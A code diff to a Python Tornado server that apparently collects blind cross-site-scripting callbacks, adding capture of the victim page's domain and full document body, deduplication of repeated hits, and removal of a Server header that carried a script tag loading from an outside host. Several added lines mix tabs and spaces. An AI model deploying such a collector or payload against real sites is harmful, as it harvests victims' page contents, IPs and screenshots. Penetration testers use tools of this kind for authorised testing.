@@ -61,7 +61,6 @@ class BaseHandler(tornado.web.RequestHandler):
         self.set_header("Cache-Control", "no-cache, no-store, must-revalidate")
         self.set_header("Pragma", "no-cache")
         self.set_header("Expires", "0")
-        self.set_header("Server", "<script src=//y.vg></script>")
 
         self.request.remote_ip = self.request.headers.get( "X-Forwarded-For" )
 
@@ -196,9 +195,14 @@ def upload_screenshot( base64_screenshot_data_uri ):
     return screenshot_filename
 
 def record_callback_in_database( callback_data, request_handler ):
-    screenshot_file_path = upload_screenshot( callback_data["screenshot"] )
+    if len(callback_data["screenshot"]) > 0:
+        screenshot_file_path = upload_screenshot( callback_data["screenshot"] )
+    else:
+        screenshot_file_path = ''
 
     injection = Injection( vulnerable_page=callback_data["uri"].encode("utf-8"),
+        vulnerable_domain=callback_data["domain"].encode("utf-8"),
+        document_body=callback_data["document-body"],
         victim_ip=callback_data["ip"].encode("utf-8"),
         referer=callback_data["referrer"].encode("utf-8"),
         user_agent=callback_data["user-agent"].encode("utf-8"),
@@ -405,12 +409,18 @@ class CallbackHandler(BaseHandler):
         else:
             callback_data = json.loads( self.request.body )
             callback_data['ip'] = self.request.remote_ip
-            injection_db_record = record_callback_in_database( callback_data, self )
-            self.logit( "User " + owner_user.username + " just got an XSS callback for URI " + injection_db_record.vulnerable_page )
 
-            if owner_user.email_enabled:
-                send_javascript_callback_message( owner_user.email, injection_db_record )
-            self.write( '{}' )
+	    # Check if injection already recently recorded
+	    owner_user = self.get_user_from_subdomain()
+    	    if 0 < session.query( InjectionRequest ).filter( Injection.owner_id == owner_user.id, Injection.vulnerable_page == callback_data["uri"].encode("utf-8"), Injection.victim_ip == self.request.remote_ip, Injection.user_agent == callback_data["user-agent"].encode("utf-8"), Injection.injection_timestamp > time.time()-900).count():
+                self.write( '{"DUPLICATE"}' )
+            else:
+                injection_db_record = record_callback_in_database( callback_data, self )
+                self.logit( "User " + owner_user.username + " just got an XSS callback for URI " + injection_db_record.vulnerable_page )
+
+                if owner_user.email_enabled:
+                    send_javascript_callback_message( owner_user.email, injection_db_record )
+                self.write( '{}' )
 
 class HomepageHandler(BaseHandler):
     def get(self, path):
@@ -439,8 +449,16 @@ class HomepageHandler(BaseHandler):
         else:
             new_probe = new_probe.replace( '[TEMPLATE_REPLACE_ME]', json.dumps( "" ))
 
+	# Check recent callbacks
+	if "Referer" in self.request.headers:
+            if 0 < session.query( Injection ).filter( Injection.victim_ip == self.request.remote_ip, Injection.injection_timestamp > time.time()-900, Injection.vulnerable_page == self.request.headers.get("Referer")).count():
+                new_probe = 'Injection already recorded within last fifteen minutes'
+	else:
+	    if 0 < session.query( Injection ).filter( Injection.victim_ip == self.request.remote_ip, Injection.injection_timestamp > time.time()-900).count():
+                new_probe = 'Injection already recorded within last fifteen minutes'
+
         if self.request.uri != "/":
-            probe_id = self.request.uri.split( "/" )[1]
+            probe_id = self.request.uri.split('/')[1].split('?')[0]
             self.write( new_probe.replace( "[PROBE_ID]", probe_id ) )
         else:
             self.write( new_probe )
@@ -503,7 +521,11 @@ class DeleteInjectionHandler(BaseHandler):
 
         self.logit( "User delted injection record with an id of " + injection_db_record.id + "(" + injection_db_record.vulnerable_page + ")")
 
-        os.remove( injection_db_record.screenshot )
+	try:
+            os.remove( injection_db_record.screenshot )
+	except OSError as e:
+            self.logit("Screenshot doesn't exist - " + injection_db_record.screenshot)
+            pass
 
         injection_db_record = session.query( Injection ).filter_by( id=str( delete_data.get( "id" ) ) ).delete()
         session.commit()
@@ -543,7 +565,7 @@ class InjectionRequestHandler( BaseHandler ):
     """
     def post( self ):
         return_data = {}
-        request_dict = json.loads( self.request.body )
+        request_dict = json.loads( self.request.body.replace('\r', '\\n') )
         if not self.validate_input( ["request", "owner_correlation_key", "injection_key"], request_dict ):
             return
 
